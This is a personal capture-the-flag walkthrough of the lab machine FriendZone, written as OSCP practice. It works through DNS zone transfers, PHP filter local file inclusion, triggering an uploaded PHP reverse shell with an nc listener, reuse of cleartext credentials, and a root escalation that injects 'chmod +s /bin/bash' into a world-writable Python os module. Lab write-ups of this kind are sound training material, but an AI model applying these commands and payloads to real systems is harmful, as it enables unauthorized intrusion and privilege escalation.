# FriendZone - `OSCP Style`

Start: 30th November 2022 - 9:00pm

End: 1st December 2022 - 5:08pm

Setup
```console
$ export IP=10.10.10.123
$ mkdir nmap
```
Added `friendzone.htb` to `/etc/hosts`.

Initial Recon
```console
$ nmap -A -T5 $IP -vv -oN nmap/initial

[REDACTED]
21/tcp  open  ftp         syn-ack vsftpd 3.0.3
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp  open  domain      syn-ack ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    syn-ack Apache httpd 2.4.29
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
```

Full Port Scan
```console
$ sudo nmap -sS -T5 -n -p- $IP -vv -oN nmap/full

[REDACTED]
21/tcp  open  ftp          syn-ack ttl 63
22/tcp  open  ssh          syn-ack ttl 63
53/tcp  open  domain       syn-ack ttl 63
80/tcp  open  http         syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
443/tcp open  https        syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63
```
Looks the same..

The initial scan doesn't reveal the FTP is allowing anonymous logins, let's check it manually.
```console
$ ftp $IP
Connected to 10.10.10.123.
220 (vsFTPd 3.0.3)
Name (10.10.10.123:ryz3n): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
```
No luck, let's check the SMB share.
```console
$ smbclient -L //$IP                                                                       
Password for [WORKGROUP\ryz3n]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))

[REDACTED]
```
Looks like there were multiple shares.

So after testing out each of them, here are the results:

1. `Files` is currently not accessible.
```console
$ smbclient //$IP/Files                                                                 
Password for [WORKGROUP\ryz3n]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```

2. `general` is accesible, and it contains a file named `creds.txt`. `read` is allowed but `write` is disabled.
```console
$ smbclient //$IP/general
Password for [WORKGROUP\ryz3n]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 15:10:51 2019
  ..                                  D        0  Tue Sep 13 10:56:24 2022
  creds.txt                           N       57  Tue Oct  9 19:52:42 2018

                3545824 blocks of size 1024. 1650276 blocks available
smb: \> get creds.txt
getting file \creds.txt of size 57 as creds.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
smb: \> put README.md 
NT_STATUS_ACCESS_DENIED opening remote file \README.md
smb: \> exit
```

3. `Development` is also accessible, but it contains nothing. However, both `read` and `write` is allowed.
```console
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 15:03:49 2019
  ..                                  D        0  Tue Sep 13 10:56:24 2022

                3545824 blocks of size 1024. 1650276 blocks available
smb: \> put creds.txt 
putting file creds.txt as \creds.txt (1.3 kb/s) (average 1.3 kb/s)
smb: \> ls
  .                                   D        0  Wed Nov 30 08:09:07 2022
  ..                                  D        0  Tue Sep 13 10:56:24 2022
  creds.txt                           A       57  Wed Nov 30 08:09:07 2022

                3545824 blocks of size 1024. 1650272 blocks available
```

That's pretty much for the SMB shares part, now we proceed to read the contents of `creds.txt`:
```console
$ cat creds.txt                                                                            
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

It contains the password of the user `admin`. I tried SSH but it's incorrect, not sure what it is for at the moment.
```console
$ ssh admin@$IP                                                                            
The authenticity of host '10.10.10.123 (10.10.10.123)' can't be established.
ED25519 key fingerprint is SHA256:ERMyoo9aM0mxdTvIh0kooJS+m3GwJr6Q51AG9/gTYx4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.123' (ED25519) to the list of known hosts.
admin@10.10.10.123's password: 
Permission denied, please try again.
```

Since port 53 (domain) is open, let's enumerate the DNS.
```console
$ dig friendzone.htb @$IP                                                                  

; <<>> DiG 9.18.7-1-Debian <<>> friendzone.htb @10.10.10.123
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: REFUSED, id: 56446          <-- HERE
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 6b68522c9a9cf5ded0af3b5c63875d1d43d89d8695300daf (good)
;; QUESTION SECTION:
;friendzone.htb.                        IN      A

;; Query time: 14 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (UDP)
;; WHEN: Wed Nov 30 08:39:39 EST 2022
;; MSG SIZE  rcvd: 71
```
The query was actually `REFUSED`. Something went wrong, maybe the domain name we're using (`friendzone.htb`) was not correct?

Since, we're not able to enumerate the DNS now, let's take a look at the `HTTP` service.

In `http://friendzone.htb`, I immediately see where the mistake is:
```html
<title>Friend Zone Escape software</title>

<center><h2>Have you ever been friendzoned ?</h2></center>

<center><img src="fz.jpg"></center>

<center><h2>if yes, try to get out of this zone ;)</h2></center>

<center><h2>Call us at : +999999999</h2></center>

<center><h2>Email us at: info@friendzoneportal.red</h2></center>
```

See the `email`? The domain name was actually `friendzoneportal.red`. So I continue to enumerate the DNS:
```console
$ dig friendzoneportal.red @$IP

; <<>> DiG 9.18.7-1-Debian <<>> friendzoneportal.red @10.10.10.123
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 2911
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: c58ddcb98d31ee568ff96be863875dbfe1482f33069ad376 (good)
;; QUESTION SECTION:
;friendzoneportal.red.          IN      A

;; ANSWER SECTION:
friendzoneportal.red.   604800  IN      A       127.0.0.1

;; AUTHORITY SECTION:
friendzoneportal.red.   604800  IN      NS      localhost.

;; ADDITIONAL SECTION:
localhost.              604800  IN      A       127.0.0.1
localhost.              604800  IN      AAAA    ::1

;; Query time: 10 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (UDP)
;; WHEN: Wed Nov 30 08:42:22 EST 2022
;; MSG SIZE  rcvd: 160
```
The query succeeded! (`NOERROR`). Let's try to perform a zone transfer.

```console
$ dig friendzoneportal.red @$IP axfr

; <<>> DiG 9.18.7-1-Debian <<>> friendzoneportal.red @10.10.10.123 axfr
;; global options: +cmd
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.   604800  IN      AAAA    ::1
friendzoneportal.red.   604800  IN      NS      localhost.
friendzoneportal.red.   604800  IN      A       127.0.0.1
admin.friendzoneportal.red. 604800 IN   A       127.0.0.1          <-- HERE!
files.friendzoneportal.red. 604800 IN   A       127.0.0.1          <-- HERE!
imports.friendzoneportal.red. 604800 IN A       127.0.0.1          <-- HERE!
vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1          <-- HERE!

friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 79 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Wed Nov 30 08:43:19 EST 2022
;; XFR size: 9 records (messages 1, bytes 309)
```
Boom! We now have all the domain names within the Name Server. I proceed to add all of them to `/etc/hosts`.

There are 4 subdomains in total:
```
1. admin.friendzoneportal.red
2. files.friendzoneportal.red
3. imports.friendzoneportal.red
4. vpn.friendzoneportal.red
```
However, visiting all of them redirected me to `survey-smileys.com`.

But then I remembered there is port 443 `HTTPS` running too. So I visited the websites using `HTTPS`, but only `admin.friendzoneportal.red` worked.

In `admin.friendzoneportal.red`, there's a login form. I tried logging in using the credentials found earlier from `creds.txt`, and I got `Admin page is not developed yet !!! check for another one`.

However, this is a bunny hole. No matter what you submit, even with blank, you get the same response.

After fumbling around for some time, I finally found something. Nikto scan reveals that the hostname `admin.friendzoneportal.red` does not match certificate's names: `friendzone.red`. So I added `friendzone.red` to `/etc/hosts`, and navigated to it.

So there is another site running at `http://friendzone.red`. There's a comment in the page's source code:
```html
<!-- Just doing some development here -->
<!-- /js/js -->
<!-- Don't go deep ;) -->
```
Then I navigated to `http://friendzone.red/js/js`, looks like there's something going on here:
```html
<p>Testing some functions !</p><p>I'am trying not to break things !</p>MmVIaE1BTXl4azE2Njk4MjI5MzV0N3JvZ005S09P<!-- dont stare too much , you will be smashed ! , it's all about times and zones ! -->
```

Whenever I refresh the page, the weird bunch of string gets refreshed as well. It was encoded in base64, but it doesn't lead to anything after decoding it.
```console
$ echo "MmVIaE1BTXl4azE2Njk4MjI5MzV0N3JvZ005S09P" | base64 -d
2eHhMAMyxk1669822935t7rogM9KOO
```

This was actually another bunny hole...

Since this box is about DNS and zones, I tried to enumerate the domain again using dig.
```console
$ dig friendzone.red @$IP                                                                  

; <<>> DiG 9.18.7-1-Debian <<>> friendzone.red @10.10.10.123
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 10894
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 9058b9ac1cad1b6cd9b4d9ab638776424d80373f0ba025be (good)
;; QUESTION SECTION:
;friendzone.red.                        IN      A

;; ANSWER SECTION:
friendzone.red.         604800  IN      A       127.0.0.1

;; AUTHORITY SECTION:
friendzone.red.         604800  IN      NS      localhost.

;; ADDITIONAL SECTION:
localhost.              604800  IN      A       127.0.0.1
localhost.              604800  IN      AAAA    ::1

;; Query time: 28 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (UDP)
;; WHEN: Wed Nov 30 10:26:56 EST 2022
;; MSG SIZE  rcvd: 154
```
Yep, I was right. So I continued to perform a zone transfer.
```console
$ dig friendzone.red @$IP axfr                                                             

; <<>> DiG 9.18.7-1-Debian <<>> friendzone.red @10.10.10.123 axfr
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1    <-- HERE !
hr.friendzone.red.      604800  IN      A       127.0.0.1    <-- HERE !
uploads.friendzone.red. 604800  IN      A       127.0.0.1    <-- HERE !
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 72 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Wed Nov 30 10:27:04 EST 2022
;; XFR size: 8 records (messages 1, bytes 289)
```
There we have it. Now we have some new subdomains to explore:
```
1. administrator1.friendzone.red
2. hr.friendzone.red
3. uploads.friendzone.red
```
I added them into `/etc/hosts` and continue exploring.

Upon visiting `https://administrator1.friendzone.red`, there's another login form. This is a real authentication form. I used the credentials found earlier in `creds.txt` (`admin:WORKWORKHhallelujah@#`), and logged in successfully. By viewing the response in BurpSuite, I was given a cookie and was told to visit `dashboard.php`.

In `/dashbord.php`, I got the following message:
```
Smart photo script for friendzone corp !
* Note : we are dealing with a beginner php developer and the application is not tested yet !


image_name param is missed !

please enter it to show the image

default is image_id=a.jpg&pagename=timestamp
```

It hints that this page accepts 2 GET parameters: `imaage_id` and `pagename`.

So let's try the given example, `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp`.

It shows an image, and with a string below:
```
Final Access timestamp is 1669828835
```

I was thinking of Local File Inclusion (LFI). Then I head to [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)'s Github repository to find for payloads.

Eventually, I was able to read the PHP source code of the page using wrappers:
```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=dashboard
```

The response will be in base64, so we have to decode it:
```console
$ echo "[PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo=]" | base64 -d > dashboard.php
```

Then we can view `dashboard.php`:
```php
<?php

//echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
//echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
echo "<title>FriendZone Admin !</title>";
$auth = $_COOKIE["FriendZoneAuth"];

if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
 echo "<br><br><br>";

echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";

if(!isset($_GET["image_id"])){
  echo "<br><br>";
  echo "<center><p>image_name param is missed !</p></center>";
  echo "<center><p>please enter it to show the image</p></center>";
  echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
 }else{
 $image = $_GET["image_id"];
 echo "<center><img src='images/$image'></center>";

 echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
 include($_GET["pagename"].".php");
 //echo $_GET["pagename"];
 }
}else{
echo "<center><p>You can't see the content ! , please login !</center></p>";
}
?>
```

Nothing quite important here, let's put this away and look into `uploads.friendzone.red` first.

In `https://uploads.friendzone.red`, I was able to upload files, but **images only**.

So I grabbed a PHP reverse shell from [revshells.com](https://www.revshells.com/) and named it `shell.php` and uploaded it. Upon submitting, it directed me to `/upload.php` and showed the folloing message:
```
Uploaded successfully !
1669829155
```
The number seems to be a timestamp.

Then I used the LFI vulnerability in `administrator.friendzone.red/dashboard.php` to read the contents of `upload.php`:
```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=../uploads/upload
```
```console
$ echo "PD9waHAKCi8vIG5vdCBmaW5pc2hlZCB5ZXQgLS0gZnJpZW5kem9uZSBhZG1pbiAhCgppZihpc3NldCgkX1BPU1RbImltYWdlIl0pKXsKCmVjaG8gIlVwbG9hZGVkIHN1Y2Nlc3NmdWxseSAhPGJyPiI7CmVjaG8gdGltZSgpKzM2MDA7Cn1lbHNlewoKZWNobyAiV0hBVCBBUkUgWU9VIFRSWUlORyBUTyBETyBIT09PT09PTUFOICEiOwoKfQoKPz4K" | base64 -d > upload.php
```

In `upload.php`:
```php
<?php

// not finished yet -- friendzone admin !

if(isset($_POST["image"])){

echo "Uploaded successfully !<br>";
echo time()+3600;
}else{

echo "WHAT ARE YOU TRYING TO DO HOOOOOOMAN !";

}

?>
```

Still nothing helpful here.

Here's the problem, we can only read files with `.php` extension. The **include** function in `dashboard.php` concatenates the pagename with `.php`, that is why we are only able to read `.php` files. So what file should we read to gain further access?

> I've wasted a lot of time here struggling with the LFI vulnerability on `administrator1.friendzone.red`. I even tried to chain PHP filters to inject PHP code into the page, hoping to execute system commands to fetch reverse shell from my box and then executing it. But it was a bunny hole after all.

> Actually I was able to execute system commands (`sleep`, `wget`) by chaining LFI wrappers onto the page, but the query was too long in the end, it exceeded the server's limitation. So the payload didn't go through. I also thought of appending the reverse shell byte by byte to a writable folder (because the document root of the web server is not writable by the service user), for example `/tmp`, but I wasn't able to send certain characters such as `whitespaces` (the payload will be too long) and `=` (the server will parse anything after the '=' character as another argument). Exporting environment variables are not possible as well due to the restriction of `=`. Appending null bytes (`%00`) at the end of the `pagename` query is not working too.

Remember the SMB shares we scanned earlier? `Development` was the one that we can upload files to it. We can upload a php reverse shell on there and trigger it by calling the full path of it using `administrator1.friendzone.red`. But what is the full path of it?

The `Files` share has a hint, indicating the full path of it (`/etc/Files`). Presumably, `Development` should be located at `/etc/Development`. Therefore, our shell `shell.php` should be at `/etc/Development/shell.php`.

```console
$ smbclient -L //$IP                                                                       
Password for [WORKGROUP\ryz3n]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files  <-- HERE
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))

[REDACTED]
```

So let's get a listener ready.
```console
$ nc -lnvp 9999
listening on [any] 9999 ...
```

Then we upload the shell.
```console
$ smbclient //$IP/Development                                                                                                                                                              
Password for [WORKGROUP\ryz3n]:
Try "help" to get a list of possible commands.
smb: \> put shell.php 
putting file shell.php as \shell.php (29.7 kb/s) (average 29.7 kb/s)
smb: \> 
```

Now we can trigger the shell at this url.
```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell
```

We now have a shell!
```console
$ nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.123] 52250
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 09:26:19 up 18:26,  0 users,  load average: 0.02, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ bash -i
bash: cannot set terminal process group (748): Inappropriate ioctl for device
bash: no job control in this shell
www-data@FriendZone:/$ whoami
whoami
www-data
www-data@FriendZone:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@FriendZone:/$ 
```

### We are now `www-data@FriendZone`.

The ***user flag*** is at `/home/friend/user.txt`.

## `www-data` to `friend`

There's a file at `/var/www/mysql_data.conf`, containing credentials:
```console
www-data@FriendZone:/var/www$ cat mysql_data.conf
cat mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```

But there were no MySQL services running on the box. Since it was the user `friend`'s password. I'll try logging in with SSH with the credentials.
```console
$ ssh friend@$IP

friend@10.10.10.123's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
You have mail.
Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3
friend@FriendZone:~$ 
```

### We are now `friend`.

## `friend` to `root`

After some exploration within the box, I found out there's a Python script at `/opt/server_admin/reporter.py`:
```console
friend@FriendZone:~$ ls -l /opt/server_admin/reporter.py 
-rwxr--r-- 1 root root 424 Jan 16  2019 /opt/server_admin/reporter.py
```
```python
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```
The script is owned by root, and we do not have the permissions to modify it. But we are able to read it.

Notice the script imports the `os` library, so let's take a quick check on it.

```console
friend@FriendZone:~$ locate os.py
/usr/lib/python2.7/os.py        <-- This one!
/usr/lib/python2.7/os.pyc
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.py
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.pyc
/usr/lib/python2.7/encodings/palmos.py
/usr/lib/python2.7/encodings/palmos.pyc
/usr/lib/python3/dist-packages/LanguageSelector/macros.py
/usr/lib/python3.6/os.py
/usr/lib/python3.6/encodings/palmos.py
```
Since the script is running using `/usr/bin/python`, it should be using the `os` library at `/usr/lib/python2.7/os.py`. Let's check the file:
```console
friend@FriendZone:~$ ls -l /usr/lib/python2.7/os.py 
-rwxrwxrwx 1 root root 25982 Dec  1 10:24 /usr/lib/python2.7/os.py
```
Wow, the file is read-write-executable by everyone!

We can proceed to hijack the script to escalate our privileges if the script is being run by a higher privileged user.

Then I copied `pspy64` from my box to watch at the processes running on the box. And the following is what I saw:
```
2022/12/01 10:20:01 CMD: UID=0    PID=31575  | /usr/bin/python /opt/server_admin/reporter.py 
2022/12/01 10:20:01 CMD: UID=0    PID=31574  | /bin/sh -c /opt/server_admin/reporter.py 
2022/12/01 10:20:01 CMD: UID=0    PID=31573  | /usr/sbin/CRON -f
```
There a cron job running at every 2 minutes, run by `root`. It calls the script using `/usr/bin/python`. That's all we need to know to exploit! We just need to hijack the `os.py` module and wait for 2 minutes to execute it as `root`.

Normally, to execute a system command in python, I would use `os.system()`, but since we are going to modify the `os` module itself, we shouldnt' be able to use it while inside of it. So I'll be using `subprocess`.

Add the following 2 lines of code at the end of `/usr/lib/python2.7/os.py`:
```python
import subprocess
print(subprocess.Popen("chmod +s /bin/bash", shell=True).read())
```
> I know it's a broken pipe, but as long as it works, it's fine.... right?

Wait for 2 minutes to let the magic happen.

Before:
```console
friend@FriendZone:/opt/server_admin$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
```
After:
```console
friend@FriendZone:/opt/server_admin$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1113504 Apr  4  2018 /bin/bash
```

`/bin/bash` now as the `suid bit`, we can run the program as the user:
```console
friend@FriendZone:/opt/server_admin$ /bin/bash -p
bash-4.4# whoami
root
bash-4.4# 
```

### We are not `root`!

The ***root flag*** is at `/root/root.txt`.

### Done!
---
## Others

The FTP service running on port 21 was using the same credentials for the user `friend`, and the ftp directory of it was actually the home directory of the user itself.

I really wasted a lot of time on `administrator1.friendzone.red`. So many bunny holes, it was quite challenging. So many bunny holes, I think I'm now slightly more mentally prepared for the OSCP exam huh? XD
